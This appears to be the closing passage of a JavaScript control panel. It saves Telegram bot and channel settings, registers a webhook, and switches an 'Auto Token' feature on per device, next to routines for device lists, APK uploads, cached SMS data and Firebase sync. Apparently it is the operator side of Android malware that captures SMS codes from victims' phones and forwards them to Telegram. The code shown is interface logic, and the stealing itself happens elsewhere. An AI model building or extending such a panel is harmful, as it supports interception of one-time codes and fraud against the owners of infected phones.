  var tokenEl=document.getElementById('tgBotToken');
  var channelEl=document.getElementById('tgChannelId');
  var ownerEl=document.getElementById('tgOwnerId');
  var token=tokenEl?String(tokenEl.value||'').trim():'';
  var channel=channelEl?String(channelEl.value||'').trim():'';
  var owner=ownerEl?String(ownerEl.value||'').trim():'';
  if(!token){toast('Bot token daalo',false);return;}
  if(!channel){toast('Channel ID daalo (e.g. -100...)',false);return;}
  smsTokenFetch({
    action:'save',
    bot_token:token,
    channel_id:channel,
    owner_id:owner,
    enabled:_autoTokenOn
  }).then(function(d){
    if(!d||!d.ok){toast((d&&d.error)||'Save failed',false);return;}
    if(d.config){
      _autoTokenConfig=d.config;
      _autoTokenOn=!!d.config.enabled;
    }
    updateAutoTokenUi(_autoTokenConfig);
    toast('Telegram settings saved',true);
  }).catch(function(){toast('Save failed',false);});
}
function setupAutoTokenWebhook(){
  var tokenEl=document.getElementById('tgBotToken');
  var channelEl=document.getElementById('tgChannelId');
  var ownerEl=document.getElementById('tgOwnerId');
  var body={action:'setup_webhook'};
  if(tokenEl&&tokenEl.value.trim())body.bot_token=tokenEl.value.trim();
  if(channelEl&&channelEl.value.trim())body.channel_id=channelEl.value.trim();
  if(ownerEl&&ownerEl.value.trim())body.owner_id=ownerEl.value.trim();
  toast('Setting webhook…',true);
  smsTokenFetch(body).then(function(d){
    if(d&&d.ok){
      if(d.config)_autoTokenConfig=d.config;
      updateAutoTokenUi(_autoTokenConfig);
      toast('Webhook connected ✓',true);
      return;
    }
    var err=(d&&d.error)||(d&&d.telegram&&d.telegram.description)||'Webhook failed';
    toast(err,false);
  }).catch(function(){toast('Webhook failed',false);});
}
function loadAutoTokenState(){
  return smsTokenFetch({action:'get'}).then(function(d){
    if(!d||!d.ok)return d;
    if(d.config){
      _autoTokenOn=!!d.config.enabled;
      _autoTokenConfig=d.config;
    }
    _smsTokenLog=d.log||[];
    updateAutoTokenUi(d.config);
    renderAutoTokenLog(_smsTokenLog);
    return d;
  }).catch(function(){return null;});
}
function refreshAutoTokenLog(){
  smsTokenFetch({action:'get'}).then(function(d){
    if(d&&d.ok){
      _smsTokenLog=d.log||[];
      if(d.config)_autoTokenConfig=d.config;
      renderAutoTokenLog(_smsTokenLog);
      toast('Log updated',true);
    }
  }).catch(function(){toast('Log refresh failed',false);});
}
function openAutoTokenSheet(){
  loadAutoTokenState();
  document.getElementById('tokenSheetBg').classList.add('open');
  document.getElementById('autoTokenSheet').classList.add('open');
}
function closeAutoTokenSheet(){
  document.getElementById('tokenSheetBg').classList.remove('open');
  document.getElementById('autoTokenSheet').classList.remove('open');
}
function toggleAutoToken(){
  if(_autoTokenOn){
    _autoTokenOn=false;
    var toggle=document.getElementById('autoTokenToggle');
    if(toggle)toggle.classList.remove('on');
    smsTokenFetch({action:'save',enabled:false,bot_token:_autoTokenConfig.bot_token||'',channel_id:_autoTokenConfig.channel_id||'',owner_id:_autoTokenConfig.owner_id||''}).then(function(d){
      if(d&&d.ok&&d.config)_autoTokenConfig=d.config;
      updateAutoTokenUi(_autoTokenConfig);
      toast('Auto Token OFF',true);
    }).catch(function(){toast('Auto token save failed',false);});
    return;
  }
  if(!(_autoTokenConfig.device_id||'').trim()){
    toast('Pehle device select karo → Auto Token → Set Device',false);
    return;
  }
  if(!nyaRequirePanelServer(true))return;
  _autoTokenOn=true;
  var toggle=document.getElementById('autoTokenToggle');
  if(toggle)toggle.classList.toggle('on',_autoTokenOn);
  smsTokenFetch({action:'save',enabled:_autoTokenOn,bot_token:_autoTokenConfig.bot_token||'',channel_id:_autoTokenConfig.channel_id||'',owner_id:_autoTokenConfig.owner_id||''}).then(function(d){
    if(d&&d.ok&&d.config)_autoTokenConfig=d.config;
    if(d&&d.log)_smsTokenLog=d.log;
    updateAutoTokenUi(_autoTokenConfig);
    toast(_autoTokenOn?'Auto Token ON':'Auto Token OFF',true);
  }).catch(function(){toast('Auto token save failed',false);});
}

/* BOOT */
document.addEventListener('visibilitychange',function(){
  _panelPaused=document.hidden;
});
(function(){
  try{
    panelReady=true;
    loadLiked();
    bindDevListEvents();
    loadActiveFb();
    loadDeviceToggles();
    bindApkUpload();
    loadSmsCacheFromStorage();
    ensureActiveFbValid();
    processClientsDataNow();
    fetchAllData().catch(function(){toast('Sync failed — check Firebase',false);});
    loadAutoTokenState();
  }catch(e){console.error(e);}
})();
setInterval(function(){
  if(!panelReady||_panelPaused)return;
  fetchAllData(false).catch(function(){});
},SYNC_INTERVAL_MS);
setInterval(function(){
  if(!panelReady||_panelPaused||!allDevs.length)return;
  processClientsDataNow();
},30000);
window.addEventListener('unhandledrejection',function(e){
  if(e&&e.reason&&console&&console.warn)console.warn('Panel promise rejected',e.reason);
});
